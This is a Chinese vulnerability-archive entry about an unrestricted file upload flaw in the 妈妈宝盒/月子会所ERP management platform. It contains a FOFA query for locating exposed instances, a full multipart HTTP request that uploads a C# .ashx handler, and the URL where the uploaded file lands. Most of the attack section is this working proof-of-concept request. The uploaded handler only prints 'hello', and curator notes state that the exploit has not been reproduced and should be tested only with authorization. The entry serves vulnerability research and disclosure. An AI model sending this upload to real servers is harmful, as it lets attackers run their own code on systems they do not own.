---
source: "wy876 漏洞文库"
title: "妈妈宝盒/月子会所ERP UploadComponent目录handler上传"
product: "妈妈宝盒/月子会所ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "未知"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/kwthyxdkdkmqfpfc"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%9C%88%E5%AD%90%E4%BC%9A%E6%89%80ERP/%E6%9C%88%E5%AD%90%E4%BC%9A%E6%89%80ERP%E7%AE%A1%E7%90%86%E4%BA%91%E5%B9%B3%E5%8F%B0UploadComponent%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "product=\"妈妈宝盒-ERP\""
id: "vw-cee5f85b244c39dc18fbafc6"
entity_id: "ve-cee5f85b244c39dc18fbafc6"
schema_version: "1"
---

# 妈妈宝盒/月子会所ERP UploadComponent目录handler上传

## 条目说明

- 对象与具体问题：妈妈宝盒/月子会所ERP；UploadComponent目录handler上传
- 版本、配置及部署条件：无版本
- 认证与权限前提：未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 完整hello处理器及日期输出路径，缺返回字段/执行证明
- 固定Content-Length和日期不可泛用，修复范围缺

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。由于未对上传文件进行任何过滤，可上传任意文件，攻击者可利用该漏洞获取服务器控制权。

## 二、影响版本
+ 月子会所ERP管理云平台

## 三、资产测绘
+ fofa`product="妈妈宝盒-ERP"`
+ 登录页面


## 四、漏洞复现
```http
POST /Page/UploadComponent/UploadComponentHandler.ashx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.ashx"

<% @ webhandler language="C#" class="AverageHandler" %> 
using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
    public bool IsReusable 
    { 
        get {
             return true; 
            } 
        } 
        public void ProcessRequest(HttpContext ctx) 
        { 
            ctx.Response.Write("hello"); 
        } 
    }
--00content0boundary00--
```

> 请求长度说明：原资料 Content-Length 为 481；静态长度已移除，应由客户端根据最终请求体的字节数生成。


上传文件位置

```plain
http://xx.xx.xx.xx/UploadBaseFolder/ERP/202308/1_230828092026228129.ashx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kwthyxdkdkmqfpfc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
